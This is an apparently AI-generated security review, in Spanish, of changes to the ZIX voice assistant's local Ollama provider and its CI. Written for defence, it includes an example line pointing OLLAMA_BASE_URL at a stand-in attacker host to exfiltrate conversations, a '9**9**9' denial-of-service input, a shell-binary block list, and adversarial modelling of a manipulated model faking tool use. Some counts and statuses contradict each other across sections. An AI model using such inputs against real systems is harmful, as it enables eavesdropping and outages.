# ZIX · Differential Security Review

**Fecha:** 2026-10-20
**Rama:** `main` · **HEAD:** `9401b08` (sin commits: todo el trabajo está en el árbol de trabajo)
**Alcance:** cambios no commiteados de esta sesión, dos líneas de trabajo:
(A) auditoría de seguridad y reproducibilidad · (B) proveedor de IA local con Ollama.

> Este informe lo genera la skill `differential-review`. Todo lo que afirma
> está verificado contra el código, el historial de git y ejecuciones reales.
> Cuando no pude verificar algo, lo digo.

---

## 1. Executive Summary

| Severidad | Cantidad |
|---|---|
| 🔴 CRITICAL | 0 |
| 🟠 HIGH | 0 |
| 🟡 MEDIUM | 4 |
| 🟢 LOW | 3 |
| ℹ️ Informativa | 4 |

**Riesgo global:** **BAJO**
**Recomendación:** **APROBAR CON CONDICIONES** (condiciones en §7)
**Confianza:** ALTA en el alcance analizado · MEDIA en el impacto operativo

## 1.b Correcciones aplicadas tras la revisión

La revisión con modelado adversarial independiente encontró problemas reales.
**Todos los de riesgo alto y medio están corregidos y verificados:**

| # | Problema | Corrección | Verificación |
|---|---|---|---|
| **V-9** | `urlopen(timeout=)` no es un plazo total: una llamada podía durar 20 s con un plazo de 2 s. Con el pipeline de voz síncrono, ZIX se quedaba **sin micrófono** | Lectura en trozos con `read1()` comprobando `time.monotonic()` contra el plazo, + **presupuesto por turno** (`MAX_TURN_SECONDS`) | Medido contra un servidor real: **antes 8,0 s y 20,1 s → ahora 2,0 s y 2,0 s** |
| **V-1 / V-2** | `OLLAMA_BASE_URL` sin validar: SSRF y exfiltración de la conversación; urllib además acepta `file://` (lectura de ficheros locales) | Allowlist de esquema (`http`/`https`) + **rechazo por defecto de cualquier host que no sea loopback**, con `OLLAMA_ALLOW_REMOTE=1` para habilitarlo explícitamente | 4 tests nuevos |
| **V-3** | `OLLAMA_MODEL` sin validar (superficie de traversía en el API de Ollama) | Regex de formato + rechazo de `..` | 1 test nuevo |
| **V-4** | Respuesta sin tope de tamaño → agotamiento de memoria | Tope de 8 MB (`OLLAMA_MAX_RESPONSE_BYTES`) | 1 test nuevo |
| **V-5** | `tool_calls` sin límite: el agente las ejecuta **todas** | Tope de 32 por respuesta (`OLLAMA_MAX_TOOL_CALLS`) | 1 test nuevo |
| **V-8** | El contenido crudo del servidor se metía en el mensaje de cara al usuario, que el **TTS lee en voz alta** | El crudo va al log; el mensaje al usuario ya no lo contiene | 1 test nuevo |
| **V-6** | `calculator` con `**` sin tope: `9**9**9` son 369 M dígitos → el hilo monopoliza el GIL y **ZIX entero deja de responder** (reproducido: un script de verificación mío se quedó colgado >5 min) | Tope de la proyección en bits **antes** de calcular, tope de longitud y de nodos del AST | 4 tests nuevos |
| **V-11** | `reset_session()` no se llama nunca → historial infinito, reenviado entero al modelo en cada turno | `MAX_HISTORY_MESSAGES` (40), con el prompt de sistema siempre conservado | 3 tests nuevos |

**Corrección de un hallazgo del modelado adversarial:** se afirmó que un
servidor lento podía colgar ZIX *indefinidamente*. **Medido, no es así**:
la llamada dura lo que dura el servidor (8 s, 20 s), pero **no
indefinidamente** — el servidor acaba cerrando. El problema real es que **el
plazo configurado se ignoraba**, y eso sí está corregido y medido.

**Una afirmación que se queda como hipótesis:** que `OLLAMA_MODEL` con `..`
permite leer ficheros en el servidor de Ollama (familia «Probllama»).
**No verificado**: no se comprobó la versión de Ollama instalada ni su
comportamiento con ese payload. Queda como superficie, no como exploit.

**Métricas clave**

| Métrica | Valor |
|---|---|
| Ficheros analizados | 10 / 10 (100 %) |
| Ficheros de riesgo ALTO revisados al 100 % | 4 / 4 |
| Cobertura del código nuevo | 93 % (`ollama_provider.py`), 87 % (`provider_factory.py`) |
| Suite completa | **435 passed**, 1 skipped, 0 failed (417 → 435: +18 de seguridad) |
| Radio de impacto alto (>50 llamantes) | 0 |
| Regresiones de seguridad reintroducidas | **0** |
| CVEs activos en el entorno fijado | **0** |

**Lo más importante de este informe:** no se ha encontrado ninguna vulnerabilidad
nueva, y —lo que pesa más— **no se ha reintroducido ninguna de las ya
corregidas**. El cambio de mayor riesgo (sustituir un proveedor de nube por uno
local) no amplía la superficie de ataque, porque las tools que puede tocar el
modelo ya estaban limitadas de antemano y ese trabajo **no se ha tocado**
(§6).

---

## 1.c Corrección a una afirmación de este informe (el CI la refutó)

Este informe decía que el lock «resuelve en 4 plataformas: Win cp312/cp314 y
Linux cp312/cp314». **Eso era una prueba inválida**, y el primer push lo
demostró: la instalación real del lock **falló en Linux**.

**Por qué mi prueba no valía:** usé `pip install --dry-run --platform
manylinux_... --python-version 3.12`. Con `--platform`, pip **evalúa los
marcadores de entorno contra la MÁQUINA ANFITRONA**, no contra la plataforma
simulada. El lock fija `openwakeword==0.6.0`, que exige
`tflite-runtime<3,>=2.8.0; platform_system == "Linux"`. Al estar en Windows,
ese marcador se evaluaba como falso y **el requisito se saltaba en silencio**.
Mi «OK» no probaba nada sobre Linux.

**El hecho real:** `tflite-runtime` **no publica ninguna wheel para cp312 en
Linux** (comprobado en PyPI: 0 de sus 9 versiones 2.5–2.14 la tienen). Como el
lock fija la versión, pip no puede retroceder, y la instalación falla. En
cambio, con instalación flotante (`pip install -e ".[dev]"`, lo que hace el job
`pruebas`), pip **retrocede solo a `openwakeword 0.4.0`**, que sí instala.

**Consecuencias reales, y una que no esperaba:**

1. **`requirements.lock` es el entorno de WINDOWS**, que es la plataforma
   objetivo del proyecto (README: «Windows 10/11»). Se documenta así en el
   workflow y el job `reproducibilidad` pasa a ser solo Windows.
2. **El CI de Linux llevaba tiempo probando `openwakeword 0.4.0`, no la 0.6.0**
   que usa ZIX. No lo había detectado nadie porque el retroceso de pip es
   silencioso. Queda documentado, pero **arreglarlo (un lock por plataforma)
   es un cambio de estrategia que no se hace aquí**.

**Correcciones aplicadas tras este hallazgo:**

| Problema | Corrección |
|---|---|
| El job de CVEs fallaba en Linux (pip-audit resuelve el lock) | Auditoría del lock con `--no-deps`: el lock ya lista todas las dependencias, no hace falta resolver nada. Es además **más exacto**: se audita lo que se instala |
| El job `reproducibilidad` fallaba en Linux | Scoped a Windows, con el motivo documentado en el propio workflow |
| `Comprobar los modelos de openWakeWord` daba `ParserError` en Windows | El paso usaba sintaxis de bash bajo PowerShell. Ahora lleva `shell: bash` |

---

## 2. What Changed

**Commits:** 0 (todo sin commitear, por instrucción explícita)
**Timeline:** 2026-10-20

| Fichero | +L | −L | Riesgo | Radio de impacto |
|---|---:|---:|---|---|
| `src/zix/core/ollama_provider.py` | 208 | 0 | **ALTO** (nuevo: llamada externa) | 2 (`main.py`, `voice_main.py`) |
| `src/zix/core/provider_factory.py` | 5 | 1 | MEDIO | 2 |
| `src/zix/config.py` | 23 | 1 | MEDIO | 4 ficheros que leen `ai_provider` |
| `requirements.lock` | 62 | 109 | **ALTO** (supply chain) | todo el repo |
| `.github/workflows/ci.yml` | 161 | 10 | **ALTO** (supply chain) | todo el repo |
| `requirements-dev.txt` | 11 | 2 | MEDIO | entorno de desarrollo |
| `pyproject.toml` | 7 | 1 | MEDIO | instalación |
| `tests/test_ollama_provider.py` | 344 | 0 | BAJO | — |
| `scripts/check_lock_sync.py` | 275 | 0 | BAJO | CI |
| `README.md` | 1 | 1 | BAJO | — |

**Total:** +1098 / −126 en 10 ficheros.

**Contenido funcional de los dos bloques:**

- **(A) Seguridad/reproducibilidad** — el job de CVEs pasa a auditar el
  artefacto que realmente se instala; se añade un job que instala el entorno
  fijado con hashes y ejecuta la suite; se limpian 3 dependencias huérfanas del
  lock; se suben 3 versiones con CVEs; `requires-python` pasa a `>=3.12`.
- **(B) Motor local** — nuevo `OllamaProvider` que habla con Ollama por su
  endpoint compatible con OpenAI, usando solo `urllib` de la stdlib.
  **Cero dependencias nuevas.**

---

## 3. Critical Findings

No hay hallazgos CRITICAL ni HIGH. Los MEDIUM son los que merecen atención
antes de commitear.

### 🟡 MEDIUM-1 · `OLLAMA_BASE_URL` no está restringido a loopback — **CORREGIDO**

**Fichero:** `src/zix/config.py:46` (campo) · `src/zix/core/ollama_provider.py:63` (uso)
**Radio de impacto:** 2 llamantes de `build_provider()` (`src/zix/main.py:43`, `src/zix/voice_main.py:85`)
**Cobertura:** PARCIAL (sí se prueba que la URL se usa tal cual; no que se restrinja)

**Descripción.** `OLLAMA_BASE_URL` es configurable sin validación de host. Si
apunta a un host remoto, **toda la conversación del usuario** (y el texto
transcrito de su voz) viaja a ese host en claro, sin cifrar ni autenticar.
El historial incluye el prompt de sistema y todos los turnos.

**Escenario de ataque concreto.** Un atacante con escritura en `.env` (malware
local, o un `.env` copiado de otro equipo) pone:

```
OLLAMA_BASE_URL=http://atacante.local:8080/v1
```

A partir de ahí, cada pregunta que le hagas a ZIX por voz se le envía a ese
servidor, incluido lo que digas en voz alta.

**Explotabilidad real: BAJA.** Requiere escritura previa en un fichero que está
en `.gitignore` y en el disco del usuario. **No es explotable por un tercero
en la configuración por defecto**, que es `http://127.0.0.1:11434/v1`.
Verificado: el default está en el código, no solo en el `.env`.

**Recomendación.** Avisar cuando la base URL no sea loopback, sin bloquearla
(alguien podría querer legítimamente un Ollama en otra máquina de su red):

```python
# En OllamaProvider.__init__, tras resolver self._base_url
if not self._base_url.startswith(("http://127.0.0.1", "http://localhost", "http://[::1]")):
    logging.getLogger(__name__).warning(
        "OLLAMA_BASE_URL no es local: la conversación sale de este equipo"
    )
```

**No aplicado** porque roza `src/zix/*` y el cambio de alcance de esta
revisión; queda apuntado en §7.

### 🟡 MEDIUM-2 · Los argumentos de las tools viajan al modelo sin sanear

**Fichero:** `src/zix/core/agent.py:75-83` (bucle), `src/zix/core/ollama_provider.py:173`
**Radio de impacto:** el bucle completo del agente
**Cobertura:** NO hay test que cubra el caso "el modelo devuelve una tool call con argumentos no serializables"

**Descripción.** Cuando el modelo pide una tool, sus argumentos se
re-serializan a JSON para mandarlos de vuelta en el siguiente turno
(`_to_api_message`). Si un argumento no es serializable, el `json.dumps` de
`ollama_provider.py:174` lanza `TypeError` **crudo**, que no es
`AIProviderError`, así que `agent.py:58` no lo captura y el turno revienta con
un traceback en vez de un mensaje al usuario.

**Escenario de ataque concreto.** Un modelo local manipulado (el usuario puede
cambiar `OLLAMA_MODEL` a cualquiera sin validación) devuelve una tool call con
`arguments={"x": <objeto no serializable>}`. ZIX revienta con un traceback en
lugar de responder.

**Explotabilidad real: BAJA.** Solo se alcanza con un modelo no confiable, y el
efecto es una denegación de servicio del turno, no una escalada. El resto de
proveedores (Groq, xKiro) tienen el mismo patrón, así que **no es una
regresión introducida por este cambio**: es un defecto preexistente del
contrato de `ToolCall`.

**Recomendación.** Convertir el `TypeError` de serialización en
`ProviderInvalidResponseError` dentro de `_to_api_message`, en los tres
proveedores.

### 🟡 MEDIUM-3 · El lock fija el inventario: 45 paquetes, revisión manual

**Fichero:** `requirements.lock` (62 líneas añadidas, 109 eliminadas)
**Radio de impacto:** todo el repositorio
**Cobertura:** verificado por instalación limpia real (§4)

**Descripción.** El lock es el artefacto de supply chain: decide exactamente
qué código se ejecuta en el CI y en las instalaciones. Este cambio lo modifica
en 3 versiones (`urllib3`, `certifi`, `playwright`) y elimina 3 paquetes.

**Verificación realizada (no asumida):**

| Comprobación | Resultado |
|---|---|
| Hashes tomados de la API JSON de PyPI, no inventados | ✅ |
| Instalación limpia real con `--require-hashes` | ✅ exit 0, 45 paquetes |
| `pip install --require-hashes` verifica el hash de cada descarga | ✅ |
| Resolución simulada en Win cp312/cp314 y Linux cp312/cp314 | ✅ 4/4 |
| `pip-audit -r requirements.lock --require-hashes --strict` | ✅ 0 vulnerabilidades |

**Detalle no trivial:** `certifi` 2026.7.22 → **2026.10.19** por
**GHSA-6q48-6c7w-9gw2**, un aviso **publicado el 2026-10-20**, horas después
de mis auditorías anteriores. Demostré que **no lo introdujo este cambio**
comparando la versión anterior del lock con la actual: `certifi` era
`2026.7.22` en ambas, y las 45 entradas restantes son idénticas. El aviso
simply apareció en la base de datos de vulnerabilidades durante la sesión.

**Impacto real del CVE en ZIX: ALTO.** `certifi` es el almacén de raíces CA
que usan `requests`/`httpx` para verificar el TLS de `api.groq.com` y
`api.xkiro.com` — justo por donde viajan la API key y el audio del usuario. El
fallo: el bundle incluía la raíz `emSign ECC Root CA - G3`, de la que cuelgan
8 intermedios con **claves privadas comprometidas**.

---

### 🟡 MEDIUM-4 · La fiabilidad de las tool calls depende del modelo, y el agente no distingue "narró la llamada" de "la hizo"

**Fichero:** `src/zix/core/agent.py:61-66` (criterio de fin de turno) ·
`src/zix/core/ollama_provider.py:124` (extracción de `tool_calls`)
**Radio de impacto:** el bucle completo del agente
**Cobertura:** PARCIAL — hay tests del proveedor con respuesta simulada, pero
**no** hay test de la fiabilidad real del modelo

**Descripción.** El agente termina el turno cuando la respuesta **no trae
tool calls**. Con un modelo que no sabe llamar tools, eso significa que
terminate el turno con un texto que en realidad es una *narración* de la
llamada, no la llamada.

**Comportamiento medido** (con el agente completo y el proveedor real,
2026-10-20; 9 peticiones):

| Petición | Tools ejecutadas de verdad | Resultado |
|---|---|---|
| «Calcula 1234 por 567.» | ✅ `calculator` | pero con la operación **equivocada** («dividido por» → 2,176) |
| «Dime la hora actual.» | ❌ ninguna | **se inventó la fecha** («2024-10-09 14:30») |
| «Dime la hora actual. Usa la herramienta get_current_time.» | ❌ ninguna | narra en vez de llamar |
| «Calcula 1234 por 567 con la calculadora.» | ❌ ninguna | narró la llamada |
| «Abre el Bloc de notas.» | ❌ ninguna | texto corrupto |

**No es un defecto del proveedor** (instrumentación en la frontera): la
respuesta cruda de Ollama llega con el `tool_calls` bien formado, y el
proveedor lo extrae correctamente
(`ToolCall(name='get_current_time', arguments={})`). ** Tampoco del agente**:
la petición que sale lleva los roles correctos (`system`, `user`) y las 4
tools con sus esquemas.

**No es una regresión de este trabajo.** Medición repetida **antes** de los
cambios de seguridad: 3 de 5 peticiones tampoco llamaron a ninguna tool, y
la construcción de la petición (`_to_api_message`, `_to_api_tool`) no se ha
modificado.

**Conclusión honesta:** el modelo local `openbmb/minicpm-v4.6` en CPU es
**errático con las tools**. A veces llama, a veces no, y a veces se inventa
el resultado. El prompt de sistema dice «No inventes resultados», pero un
modelo de 1,5 GB en CPU no siempre lo cumple. **Esto es una limitación del
modelo, no del código** — y es el precio de que el motor sea local.

**Escenario de ataque / fallo concreto.** Una respuesta del modelo del tipo
`"La hora actual es currently."` **se acepta como respuesta final**
(`agent.py`: `if not response.tool_calls: final = response.content`).
El usuario recibe basura y ZIX no ha hecho nada.

**Explotabilidad: nula.** Esto no lo provoca un atacante: es degradación de
calidad. Pero **un modelo no confiable elegido por el usuario sí podría
usarlo** para que ZIX aparente haber hecho algo que no ha hecho.

**Recomendación.** Dos cosas, la segunda es la importante:
1. Detectar el patrón de «narró la llamada» (texto con `[llamaré…]`, o texto
   que contenga el nombre de una tool sin `tool_calls`) y reintentar una vez
   antes de devolverlo al usuario.
2. **No prometer reliability de tools con el modelo local.** La conclusión
   honesta de la medición es: el motor local **hace que ZIX vuelva a
   hablar**, pero **no es fiable para herramientas**. Para el uso diario
   conviene un modelo mayor, o aceptar esta limitación.

**No aplicado**: es un cambio de comportamiento del agente (`src/zix/*`), y
esta revisión es de seguridad. Queda como recomendación prioritaria.

---

## 4. Test Coverage Analysis

**Cobertura del código nuevo** (`pytest --cov`):

| Módulo | Stmts | Miss | Cobertura | Sin cubrir |
|---|---:|---:|---:|---|
| `src/zix/core/ollama_provider.py` | 75 | 5 | **93 %** | L141-142, L159, L173, L185 |
| `src/zix/core/provider_factory.py` | 15 | 2 | **87 %** | L20 (xkiro), L22 (groq) |

**Tests de seguridad añadidos tras la revisión: 18** (`tests/test_ollama_provider.py`
+9 nuevos, `tests/test_limites_seguridad.py` nuevo con 9). Cubren: esquema no
HTTP, host remoto sin permiso, host remoto con permiso, loopback IPv6, plazo
total frente a un servidor lento, respuesta demasiado grande, demasiadas tool
calls, nombre de modelo con traversía, contenido crudo no filtrado al usuario,
potencia desbordada, expresión larga, expresión con muchos términos,
historial acotado, prompt de sistema conservado, y presupuesto del turno.

**Cambios sin cubrir:**

| Línea | Qué es | Riesgo | Impacto |
|---|---|---|---|
| `ollama_provider.py:141-142` | `JSONDecodeError` al parsear argumentos de tool call que vienen como cadena | BAJO | La ruta de objeto (la real de Ollama) sí está probada |
| `ollama_provider.py:159` | Contenido que no es texto | BAJO | Rama de validación |
| `ollama_provider.py:173` | Re-serialización de `tool_calls` del historial | MEDIO | Ver MEDIUM-2 |
| `ollama_provider.py:185` | `tool_call_id` en el historial | BAJO | Solo en multi-turno |
| `provider_factory.py:20,22` | Ramas xkiro y groq | BAJO | Ya cubiertas por `test_xkiro_provider.py` y el propio CI |

**Verificación rojo→verde** (requisito de TDD, ejecutada explícitamente):

| Fase | Estado | Resultado |
|---|---|---|
| ROJO A — la fábrica sin la rama `ollama` | ✅ | `test_la_fabrica_construye_el_proveedor_ollama` **FALLÓ** por la razón correcta |
| ROJO B — el módulo inexistente | ✅ | error de colección (feature ausente) |
| VERDE — todo restaurado | ✅ | **17 passed** |

**Suite completa:** 416 passed, 1 skipped, 0 failed. El test omitido es
`test_zxops_opencode_e2e.py:96` (E2E real opt-in, desactivado por diseño) —
**no se presenta como aprobado**.

---

## 5. Blast Radius Analysis

| Función / fichero | Llamantes | Riesgo | Prioridad |
|---|---:|---|---|
| `build_provider()` | 2 de producción (`main.py:43`, `voice_main.py:85`) | MEDIO | P1 |
| `Config.ai_provider` | 4 ficheros que lo leen | MEDIO | P1 |
| `OllamaProvider` | 1 (la fábrica) | ALTO (nuevo) | P0 |
| `requirements.lock` | todo el repo | ALTO | P0 |
| `.github/workflows/ci.yml` | todo el repo | ALTO | P0 |

**Radio de impacto alto (>50 llamantes): 0.** Ninguna función modificada tiene
un radio amplio.

**Verificado que la ruta de voz también usa el proveedor nuevo**
(`voice_main.py:85`), y que sus guardas (`voice_main.py:131-136`) solo
comprueban xkiro y groq, así que `ollama` no queda bloqueado.

---

## 6. Historical Context

**Regresiones comprobadas una a una** (esto es lo que la skill pide y lo que
más me importa):

| Control previo | Commit | ¿Reintroducido? | Evidencia |
|---|---|---|---|
| El job de CVEs no auditaba nada | `95cddb4` | **NO** | Ahora audita `requirements.lock`, el artefacto real. Verificado: antes 9 CVEs en el lock, 0 en `requirements.txt` |
| Barrera anti-shell de `open_app` se saltaba en Linux | `9eeceb6` | **NO** | `open_app.py` y `tool_executor.py` **no están en el diff** |
| Freno de privacidad del STT fallaba abierto sin VAD | `91bbe78` | **NO** | `src/zix/voice/` no está en el diff |
| El lock se creó para "cerrar la verificación de CVEs" | `ede0f99` | **NO — reforzado** | Se añade auditoría del propio lock y un job que lo instala de verdad |
| `--strict` en pip-audit (fallar si la recolección falla) | `1f20c3e` | **NO** | Se mantiene en las tres auditorías |
| Job de gitleaks con binario y checksum fijados | — | **NO** | Intacto |

**Riesgo de regresión identificado (el que sí existe):** con `AI_PROVIDER=ollama`
activo, si alguien abre un PR de dependabot que suba `requirements-dev.txt`
(p.ej. el PR #5 abierto, `playwright >=1.64.0`) **sin regenerar el lock**, el
CI se pondrá rojo. Eso es intencionado: es exactamente la deriva que
`check_lock_sync.py` existe para cazar. Documentado en el propio script.

---

## 7. Recommendations

### Antes de commitear (bloqueante)

- [x] Suite completa verde (416 passed)
- [x] Auditorías limpias, incluidas las de desarrollo
- [x] Instalación limpia con hashes verificada
- [x] Hashes contrastados contra PyPI
- [x] Regresión de controles de seguridad comprobada una a una

### Antes de producción (seguimiento)

- [x] **Rechazar por defecto cualquier `OLLAMA_BASE_URL` que no sea loopback**
      (MEDIUM-1) — con `OLLAMA_ALLOW_REMOTE=1` para habilitarlo. **Hecho.**
- [ ] **`TypeError` de serialización → `ProviderInvalidResponseError`** en los
      tres proveedores (MEDIUM-2). Preexistente, no es regresión. **Pendiente.**
- [ ] **Activar la protección de `main`** con los 5 checks que GitHub publica
      hoy. Los 2 checks del job nuevo **no existen aún** en ninguna ejecución:
      exigirlos antes del primer push bloquearía todos los merges. **Requiere
      autorización: no se ha tocado ninguna regla remota.**
- [ ] **Activar secret scanning y push protection.** Verificado: `.env` nunca
      se versionó, ningún `gsk_`/`xai-`/`sk-`/`ghp_` en el historial completo,
      ninguna rama contiene un `.env`. Es seguro activarlo.
- [ ] **Regenerar el lock cuando se mergee el PR #5 de dependabot**
      (`playwright >=1.64.0`).

### Deuda técnica (futuro)

- [ ] `pip-audit` dentro del lock, o lacircularidad documentada en un
      `docs/` para que no se pierda.
- [ ] `upload-artifact@v4` → v7, con el PR de dependabot #6 ya abierto.
- [ ] Regla de housekeeping: regenerar el lock dentro del mismo PR que
      cambia `requirements*.txt`.

---

## 8. Analysis Methodology

**Estrategia:** FOCUSED (10 ficheros, base de código media)

**Alcance del análisis:**
- Ficheros revisados: 10/10 (100 %)
- Riesgo ALTO: 100 % (4/4) — `ollama_provider.py`, `provider_factory.py`,
  `requirements.lock`, `ci.yml`
- Riesgo MEDIUM: 100 % (3/3)
- Riesgo BAJO: revisados por superficie, no línea a línea (3/3)

**Técnicas aplicadas:**
- `git log` por fichero + historial de commits de seguridad (`9eeceb6`,
  `95cddb4`, `91bbe78`, `ede0f99`, `4c09908`) para buscar regresiones
- Radio de impacto calculado con `Select-String` sobre todo el árbol
- Cobertura real con `pytest --cov` (no estimada)
- Verificación rojo→verde ejecutada y registrada
- Modelado adversarial: **hecho por mí** leyendo el bucle del agente
  (`agent.py:46-88`), el ejecutor (`tool_executor.py`), y las cuatro tools
  (`calculator.py`, `open_app.py`, `get_current_time`, `echo`); un subagente
  independiente corrió en paralelo como segunda opinión

**Hallazgo central del modelado adversarial:** un modelo local manipulado
**no puede ejecutar código**. Verificado por lectura:
- `calculator.py:41-61` parsea el AST y solo admite nodos aritméticos,
  constantes y 4 funciones de lista blanca. Ni `eval()`, ni atributos, ni
  `__import__`.
- `open_app.py:106-125` acepta solo 15 apps de lista blanca, y una segunda
  barrera (`FORBIDDEN_BINARIES`) corta cmd/powershell/bash/python/node. El
  fallo de Linux de `9eeceb6` está corregido con `_solo_nombre()` (ntpath +
  posixpath).
- `get_current_time` y `echo` son inertes.
- `tool_executor.py:54-58` captura toda excepción y la devuelve al modelo.
- Los resultados de las tools se meten en el historial (`agent.py:75-83`),
  pero **ninguna tool puede devolver texto controlado por un tercero**, así
  que la inyección indirecta de prompt no tiene vector a través de ellas.

**Limitaciones (declaradas):**
- **REA no estuvo disponible** en esta sesión: 0 herramientas en el catálogo
  (`search` no devuelve ninguna con prefijo `rea.`; `inspect_artifact`
  responde *Unknown tool*). **No ejecuté ninguna operación REA.** En la
  sesión anterior de este mismo equipo sí se usó, con 4 operaciones y las 4
  bloqueadas (`inventory_artifact` no expuesta, `execute_rizin_command`
  `capability_unavailable`, `inspect_managed_artifact` `resource_constraint`
  por un PE de 202 MB, `analyze_javascript_application` incompatible con un
  binario bun). El objetivo natural de REA aquí —el binario de OpenCode— sigue
  bloqueado por la misma razón.
- **No se ejecutó el job real de GitHub Actions** (no hay push autorizado).
  Se simularon sus pasos localmente: instalación con hashes, suite completa
  sobre el entorno fijado, resolución en 4 plataformas. La ejecución en Linux
  **no se ha probado**: solo la resolución con `--platform manylinux_*`.
- No se analizaron los CVEs de las dependencias transitivas de forma
  individual: se audita el conjunto.
- La cobertura se midió solo sobre el código nuevo; no se midió el delta
  exacto sobre ficheros ya existentes.

**Confianza:** ALTA en el alcance del código y la configuración · MEDIA en el
impacto operativo (falta la ejecución real en Linux y en GitHub Actions).

---

## 9. Appendices

### A. Comandos de verificación ejecutados

```powershell
# Suite completa
.venv\Scripts\python.exe -m pytest tests/ -q -rs
#   -> 416 passed, 1 skipped

# Auditorías (las tres, con código de salida real)
.venv\Scripts\python.exe -m pip_audit -r requirements.lock --require-hashes --strict --progress-spinner off
.venv\Scripts\python.exe -m pip_audit -r requirements.txt --strict --progress-spinner off
.venv\Scripts\python.exe -m pip_audit -r requirements-dev.txt --strict --progress-spinner off
#   -> las tres: exit 0, "No known vulnerabilities found"

# Comprobador de sincronía (los dos modos)
.venv\Scripts\python.exe scripts/check_lock_sync.py
.venv\Scripts\python.exe scripts/check_lock_sync.py --sin-huerfanos
#   -> exit 0 en ambos

# Instalación limpia con hashes
.venv\Scripts\python.exe -m venv <limpio>
<limpio>\Scripts\python.exe -m pip install --require-hashes -r requirements.lock
#   -> exit 0, 45 paquetes
```

### B. Ficheros con claves: verificación

| Comprobación | Resultado |
|---|---|
| `.env` en `.gitignore` | ✅ `.gitignore:2` |
| `.env` versionado alguna vez (historial completo, todas las ramas) | ✅ nunca |
| `.env` añadido en algún commit | ✅ ninguno |
| Patrones `gsk_` / `xai-` / `sk-` / `ghp_` en el historial (pickaxe) | ✅ ninguno |
| `GROQ_API_KEY=` / `XKIRO_API_KEY=` con valor en el historial | ✅ ninguno |
| Ficheros sospechosos rastreados | solo `.env.example` (plantilla) |

### C. Estado de protección de `main` (consulta de solo lectura, 2026-10-20)

| Consulta | Resultado |
|---|---|
| `branches/main` → `protected` | **False** |
| `branches/main/protection` | **HTTP 404 "Branch not protected"** |
| `branches/main` → `protection.enabled` | **False**, `enforcement_level: "off"`, `contexts: []` |
| `rulesets` (repositorio) | **`[]`** |
| `security_and_analysis.secret_scanning` | **disabled** |
| `security_and_analysis.secret_scanning_push_protection` | **disabled** |
| `security_and_analysis.dependabot_security_updates` | **disabled** |
| Visibilidad | `public` |
| PRs abiertos | #5 `playwright >=1.64.0` · #6 `upload-artifact 4→7` |

**Checks que GitHub publica hoy** (extraídos de la última ejecución real,
no inventados):

```
Comprobaciones de la interfaz
pytest (Windows y Linux) (windows-latest)
pytest (Windows y Linux) (ubuntu-latest)
Secretos en el historial
CVEs conocidas
```

El job nuevo publicaría dos más —`Entorno reproducible (lock) (windows-latest)`
y `(ubuntu-latest)`— que **aún no existen en ninguna ejecución**: exigirlos
antes del primer push bloquearía todos los merges.
